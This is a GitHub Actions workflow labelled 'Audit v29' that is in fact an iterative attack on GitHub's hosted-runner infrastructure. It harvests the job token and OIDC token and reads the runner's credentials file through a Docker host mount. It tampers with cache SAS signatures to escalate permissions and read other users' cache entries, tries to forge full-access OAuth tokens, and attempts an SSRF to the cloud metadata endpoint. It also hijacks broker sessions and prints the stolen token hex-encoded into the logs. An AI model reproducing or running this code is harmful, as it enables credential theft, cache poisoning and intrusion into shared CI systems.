name: Audit v29
on:
  pull_request:
    types: [opened, synchronize, reopened]

permissions:
  contents: write
  pull-requests: write
  id-token: write
  actions: write
  packages: write
  checks: write
  statuses: write
  deployments: write
  issues: write

jobs:
  audit-v29:
    runs-on: ubuntu-latest
    env:
      UPSTREAM_OWNER: twrps
      UPSTREAM_REPO: PoC-RACE2
      FORK_OWNER: lacaag
      FORK_REPO: PoC-RACE2
    steps:

      # ══════════════════════════════════════════════════════════════
      # STEP 1: Harvest
      # ══════════════════════════════════════════════════════════════
      - name: Step 1 - Harvest
        if: always()
        run: |
          set +e
          echo "=== V29 HARVEST ==="
          echo "$PATH" > /tmp/saved_path.txt
          RT="${{ secrets.GITHUB_TOKEN }}"
          echo "$RT" > /tmp/rt.txt
          echo "RT_PFX=${RT:0:14} LEN=${#RT}"
          echo "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" > /tmp/idtok.txt
          echo "IDTOK_LEN=${#ACTIONS_ID_TOKEN_REQUEST_TOKEN}"
          WLOG=$(find /home/runner/actions-runner -name "Worker_*.log" -type f 2>/dev/null | head -1)
          if [ -f "$WLOG" ]; then
            RUN_URL=$(grep -oP '"url"\s*:\s*"https://run-actions[^"]+' "$WLOG" | head -1 | sed 's/"url"\s*:\s*"//')
            echo "RUN_URL=$RUN_URL"; echo "$RUN_URL" > /tmp/run_url.txt
            for KEY in PipelinesServiceUrl CacheServerUrl ResultsServiceUrl; do
              VAL=$(grep -oP "\"${KEY}\"\\s*:\\s*\"\\K[^\"]+" "$WLOG" | head -1)
              echo "$KEY=$VAL"; echo "$VAL" > /tmp/${KEY}.txt
            done
            PLAN=$(grep -oP '"planId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
            JOB=$(grep -oP '"jobId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
            echo "PLAN=$PLAN JOB=$JOB"
            echo "$PLAN" > /tmp/plan.txt; echo "$JOB" > /tmp/job.txt
          fi
          docker run --rm -v /:/h alpine sh -c '
            F=$(find /h/home/runner -name ".credentials" -type f 2>/dev/null | head -1)
            [ -f "$F" ] && { echo "CRED_HEX_START"; xxd -p "$F" | tr -d "\n"; echo ""; echo "CRED_HEX_END"; }
          ' 2>/dev/null > /tmp/hex_extract.txt
          python3 -c "
          import binascii,json
          raw=open('/tmp/hex_extract.txt').read()
          s=raw.find('CRED_HEX_START');e=raw.find('CRED_HEX_END')
          if s>=0 and e>=0:
            h=raw[s+14:e].strip()
            d=json.loads(binascii.unhexlify(h).decode())
            t=d.get('Data',{}).get('token','')
            open('/tmp/cred_token.txt','w').write(t)
            print(f'CTOK_LEN={len(t)}')
          " 2>/dev/null
          echo "RT_HEX=$(echo -n "$RT" | xxd -p | tr -d '\n')"

      # ══════════════════════════════════════════════════════════════
      # STEP 2: SAS blob abuse — FIXED container extraction
      # v28: got hostname instead of actions-cache as container
      # ══════════════════════════════════════════════════════════════
      - name: Step 2 - SAS fixed
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== SAS FIXED ==="
          IDTOK=$(cat /tmp/idtok.txt)
          RESULTS="https://results-receiver.actions.githubusercontent.com"

          # Get signed URL
          VER=$(echo -n "v29-sas" | sha256sum | cut -d' ' -f1)
          R=$(/usr/bin/curl -sS -X POST \
            -H "Authorization: Bearer $IDTOK" -H "Content-Type: application/json" \
            "$RESULTS/twirp/github.actions.results.api.v1.CacheService/CreateCacheEntry" \
            -d "{\"key\":\"v29-sas-probe\",\"version\":\"$VER\"}")
          UPLOAD_URL=$(echo "$R" | jq -r '.signed_upload_url // empty')
          echo "URL: $UPLOAD_URL"

          if [ -n "$UPLOAD_URL" ]; then
            # Parse correctly: host/container/blob?sas
            BLOB_HOST=$(echo "$UPLOAD_URL" | grep -oP 'https://[^/]+')
            # Container is always "actions-cache" based on v27 URLs
            CONTAINER="actions-cache"
            BLOB_NAME=$(echo "$UPLOAD_URL" | sed "s|${BLOB_HOST}/${CONTAINER}/||" | cut -d'?' -f1)
            SAS="?$(echo "$UPLOAD_URL" | cut -d'?' -f2)"
            echo "HOST=$BLOB_HOST CONTAINER=$CONTAINER BLOB=$BLOB_NAME"
            echo "SAS=$(echo "$SAS" | head -c 60)..."

            # A: List blobs in actions-cache container
            echo "--- A: Container list ---"
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
              "${BLOB_HOST}/${CONTAINER}?restype=container&comp=list&maxresults=20${SAS}")
            CODE=$(echo "$R" | tail -1)
            echo "A list = $CODE | $(echo "$R" | sed '$d' | head -c 400)"

            # The SAS is per-blob (sr=b), try with container scope tricks
            echo "--- A2: Change sr to c ---"
            SAS_C=$(echo "$SAS" | sed 's/sr=b/sr=c/')
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
              "${BLOB_HOST}/${CONTAINER}?restype=container&comp=list&maxresults=20${SAS_C}")
            CODE=$(echo "$R" | tail -1)
            echo "A2 = $CODE | $(echo "$R" | sed '$d' | head -c 400)"

            # B: Read adjacent entries by blob name
            echo "--- B: Adjacent entries ---"
            BLOB_PREFIX=$(echo "$BLOB_NAME" | grep -oP '^[^-]+-')
            BLOB_NUM=$(echo "$BLOB_NAME" | grep -oP '[0-9]+$')
            echo "PREFIX=$BLOB_PREFIX NUM=$BLOB_NUM"
            if [ -n "$BLOB_NUM" ]; then
              for OFFSET in -100 -10 -5 -1 1 5 10 100; do
                ADJ=$((BLOB_NUM + OFFSET))
                R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 2 -m 3 \
                  "${BLOB_HOST}/${CONTAINER}/${BLOB_PREFIX}${ADJ}${SAS}")
                CODE=$(echo "$R" | tail -1)
                [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && \
                  echo "B ${BLOB_PREFIX}${ADJ} = $CODE | $(echo "$R" | sed '$d' | head -c 100)"
              done
            fi

            # C: Change sp= permission from cw to r (read) or rwdl
            echo "--- C: Permission escalation ---"
            for PERM in "r" "rwdl" "racwdl" "rl" "rw"; do
              SAS_P=$(echo "$SAS" | sed "s/sp=cw/sp=$PERM/")
              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 2 -m 3 \
                "${BLOB_HOST}/${CONTAINER}/${BLOB_NAME}${SAS_P}")
              CODE=$(echo "$R" | tail -1)
              echo "C sp=$PERM = $CODE | $(echo "$R" | sed '$d' | head -c 200)"
            done

            # D: Try to read v27's poisoned entries by constructing entry IDs
            echo "--- D: Read v27 entries ---"
            for EID in "3104606339" "3104606520" "3104606699" "3104606873" "3104607030"; do
              # The blob name format is prefix-entryId
              for PFX in "e67" "120" "ef4" "956" "7ff"; do
                R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 2 -m 3 \
                  "${BLOB_HOST}/${CONTAINER}/${PFX}-${EID}${SAS}")
                CODE=$(echo "$R" | tail -1)
                BODY=$(echo "$R" | sed '$d')
                [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && \
                  echo "D ${PFX}-${EID} = $CODE | $(echo "$BODY" | head -c 100)"
              done
            done
          fi

      # ══════════════════════════════════════════════════════════════
      # STEP 3: vstoken oauth2 with FORM-URLENCODED
      # v28: POST with JSON got 500 "wants form-urlencoded"
      # CTOK gets "missing clientId" — needs clientId
      # Try OIDC token with vstoken audience as assertion
      # ══════════════════════════════════════════════════════════════
      - name: Step 3 - vstoken oauth2 form
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== VSTOKEN OAUTH2 ==="
          RT=$(cat /tmp/rt.txt)
          CTOK=$(cat /tmp/cred_token.txt 2>/dev/null)
          IDTOK=$(cat /tmp/idtok.txt)
          VSBASE="https://vstoken.actions.githubusercontent.com/serviceDeployments/tokenghubeus21"

          # Get OIDC token with vstoken audience
          OIDC=$(/usr/bin/curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=https://vstoken.actions.githubusercontent.com" | jq -r '.value // empty')
          echo "OIDC: ${#OIDC} chars"

          # URL-encode tokens
          CTOK_ENC=$(python3 -c "import urllib.parse;print(urllib.parse.quote(open('/tmp/cred_token.txt').read().strip()))" 2>/dev/null)
          IDTOK_ENC=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))" "$IDTOK" 2>/dev/null)

          # A: CTOK on vstoken with various clientIds
          echo "--- A: CTOK on vstoken ---"
          for CID in \
            "" \
            "$(python3 -c "import json,base64;t=open('/tmp/cred_token.txt').read().strip().split('.')[1];t+='='*(4-len(t)%4);c=json.loads(base64.urlsafe_b64decode(t));print(c.get('orch_id',''))" 2>/dev/null)" \
            "$(python3 -c "import json,base64;t=open('/tmp/cred_token.txt').read().strip().split('.')[1];t+='='*(4-len(t)%4);c=json.loads(base64.urlsafe_b64decode(t));print(c.get('owner_id',''))" 2>/dev/null)" \
            "$(python3 -c "import json,base64;t=open('/tmp/cred_token.txt').read().strip().split('.')[1];t+='='*(4-len(t)%4);c=json.loads(base64.urlsafe_b64decode(t));print(str(c.get('runner_id','')))" 2>/dev/null)"; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
              -H "Content-Type: application/x-www-form-urlencoded" \
              "$VSBASE/_apis/oauth2/token" \
              -d "grant_type=client_credentials&client_assertion=$CTOK_ENC&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_id=$CID&scope=vso.full_access")
            CODE=$(echo "$R" | tail -1)
            echo "A cid='$CID' = $CODE | $(echo "$R" | sed '$d' | head -c 300)"
          done
          echo ""

          # B: OIDC token as assertion on vstoken
          echo "--- B: OIDC on vstoken ---"
          if [ -n "$OIDC" ]; then
            OIDC_ENC=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))" "$OIDC" 2>/dev/null)
            for GRANT in "client_credentials" "urn:ietf:params:oauth:grant-type:jwt-bearer"; do
              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
                -H "Content-Type: application/x-www-form-urlencoded" \
                "$VSBASE/_apis/oauth2/token" \
                -d "grant_type=$GRANT&client_assertion=$OIDC_ENC&assertion=$OIDC_ENC&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_id=&scope=vso.full_access")
              CODE=$(echo "$R" | tail -1)
              echo "B $GRANT = $CODE | $(echo "$R" | sed '$d' | head -c 300)"
            done
          fi
          echo ""

          # C: Try tokenoauth2 endpoint specifically
          echo "--- C: tokenoauth2 ---"
          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
            -H "Content-Type: application/x-www-form-urlencoded" \
            "$VSBASE/_apis/tokenoauth2/token" \
            -d "grant_type=client_credentials&client_assertion=$CTOK_ENC&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_id=v29&scope=vso.full_access")
          CODE=$(echo "$R" | tail -1)
          echo "C tokenoauth2 = $CODE | $(echo "$R" | sed '$d' | head -c 300)"

          # D: JWKS keys — get the actual signing keys
          echo "--- D: JWKS ---"
          R=$(/usr/bin/curl -sS "https://token.actions.githubusercontent.com/.well-known/jwks")
          echo "D JWKS keys: $(echo "$R" | jq '.keys | length' 2>/dev/null)"
          echo "$R" | jq -c '.keys[]? | {kid, kty, use, alg}' 2>/dev/null | head -5

      # ══════════════════════════════════════════════════════════════
      # STEP 4: pipelinesproxcus1 deep + write ops
      # v28: connData=200, resourceareas=200 (17 areas)
      # Hit APIs on this alternate deployment
      # ══════════════════════════════════════════════════════════════
      - name: Step 4 - prox deployment
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== PROX DEPLOYMENT ==="
          RT=$(cat /tmp/rt.txt)
          CTOK=$(cat /tmp/cred_token.txt 2>/dev/null)
          PLAN=$(cat /tmp/plan.txt 2>/dev/null)
          PROX="https://pipelines.actions.githubusercontent.com/serviceDeployments/pipelinesproxcus1"

          # A: Try secret path on proxcus1
          echo "--- A: Secret on prox ---"
          SECRET="ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF"
          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" \
            -H "Authorization: Bearer $RT" \
            "https://pipelines.actions.githubusercontent.com/serviceDeployments/pipelinesproxcus1/$SECRET/_apis/connectionData")
          CODE=$(echo "$R" | tail -1)
          echo "A secret/connData = $CODE | $(echo "$R" | sed '$d' | head -c 250)"

          # B: Try timeline/logs on prox with same plan
          echo "--- B: Plan on prox ---"
          for EP in \
            "/_apis/distributedtask/plans/$PLAN/timelines" \
            "/_apis/distributedtask/plans/$PLAN/logs" \
            "/_apis/distributedtask/plans/$PLAN/attachments" \
            "/_apis/distributedtask/plans/$PLAN/events"; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
              -H "Authorization: Bearer $RT" "$PROX$EP")
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && \
              echo "B $EP = $CODE | $(echo "$BODY" | head -c 250)"
          done

          # C: Write ops on prox
          echo "--- C: Write on prox ---"
          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
            -H "Authorization: Bearer $RT" -H "Content-Type: application/json" \
            "$PROX/_apis/distributedtask/variablegroups" \
            -d '{"name":"v29-prox","type":"Vsts","variables":{"key":{"value":"v29"}}}')
          CODE=$(echo "$R" | tail -1)
          echo "C vargroup = $CODE | $(echo "$R" | sed '$d' | head -c 250)"

          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
            -H "Authorization: Bearer $RT" -H "Content-Type: application/json" \
            "$PROX/_apis/distributedtask/events" \
            -d '{"name":"v29","data":"test"}')
          CODE=$(echo "$R" | tail -1)
          echo "C event = $CODE | $(echo "$R" | sed '$d' | head -c 250)"

          # D: oauth2 on prox with form-urlencoded
          echo "--- D: OAuth2 on prox ---"
          CTOK_ENC=$(python3 -c "import urllib.parse;print(urllib.parse.quote(open('/tmp/cred_token.txt').read().strip()))" 2>/dev/null)
          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
            -H "Content-Type: application/x-www-form-urlencoded" \
            "$PROX/_apis/oauth2/token" \
            -d "grant_type=client_credentials&client_assertion=$CTOK_ENC&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_id=v29&scope=vso.full_access")
          CODE=$(echo "$R" | tail -1)
          echo "D oauth2 = $CODE | $(echo "$R" | sed '$d' | head -c 300)"

          # E: SSRF on prox — service endpoint creation
          echo "--- E: Prox SSRF ---"
          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
            -H "Authorization: Bearer $RT" -H "Content-Type: application/json" \
            "$PROX/_apis/serviceendpoint/endpoints" \
            -d '{"name":"v29-ssrf","type":"generic","url":"http://169.254.169.254/metadata/instance?api-version=2021-02-01","authorization":{"scheme":"None"}}')
          CODE=$(echo "$R" | tail -1)
          echo "E serviceendpoint = $CODE | $(echo "$R" | sed '$d' | head -c 250)"

      # ══════════════════════════════════════════════════════════════
      # STEP 5: Broker — investigate runner status more deeply
      # v28: "invalid runner status: " — empty status after colon
      # ══════════════════════════════════════════════════════════════
      - name: Step 5 - Broker status
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== BROKER STATUS ==="
          CTOK=$(cat /tmp/cred_token.txt 2>/dev/null)
          BROKER="https://broker.actions.githubusercontent.com"
          [ -z "$CTOK" ] || [ ${#CTOK} -lt 10 ] && { echo "NO CTOK"; exit 0; }

          # A: Full verbose response from message to see runner status
          echo "--- A: Verbose message ---"
          /usr/bin/curl -sS -X DELETE -H "Authorization: Bearer $CTOK" "$BROKER/session" > /dev/null
          /usr/bin/curl -sS -X POST -H "Authorization: Bearer $CTOK" -H "Content-Type: application/json" \
            "$BROKER/session" -d '{}' > /dev/null
          R=$(/usr/bin/curl -vvv --connect-timeout 5 -m 8 \
            -H "Authorization: Bearer $CTOK" "$BROKER/message" 2>&1)
          echo "A verbose:"
          echo "$R" | grep -iE "^[<>*]|status|runner|invalid|HTTP/" | head -20
          echo ""

          # B: Try different content types on session
          echo "--- B: Session content types ---"
          /usr/bin/curl -sS -X DELETE -H "Authorization: Bearer $CTOK" "$BROKER/session" > /dev/null
          for CT in \
            "application/json" \
            "application/x-www-form-urlencoded" \
            "text/plain"; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
              -H "Authorization: Bearer $CTOK" -H "Content-Type: $CT" \
              "$BROKER/session" \
              -d '{"ownerName":"v29","runnerStatus":"Online","agentStatus":"Online"}')
            CODE=$(echo "$R" | tail -1)
            echo "B $CT = $CODE | $(echo "$R" | sed '$d' | head -c 300)"
            # Now try message
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 5 -m 8 \
              -H "Authorization: Bearer $CTOK" "$BROKER/message?lastMessageId=0")
            CODE=$(echo "$R" | tail -1)
            echo "  message = $CODE | $(echo "$R" | sed '$d' | head -c 200)"
            /usr/bin/curl -sS -X DELETE -H "Authorization: Bearer $CTOK" "$BROKER/session" > /dev/null
          done

      # ══════════════════════════════════════════════════════════════
      # STEP 6: Final
      # ══════════════════════════════════════════════════════════════
      - name: Step 6 - Final
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== V29 FINAL ==="
          echo "RT_HEX=$(cat /tmp/rt.txt | xxd -p | tr -d '\n')"
          echo "=== V29 COMPLETE ==="
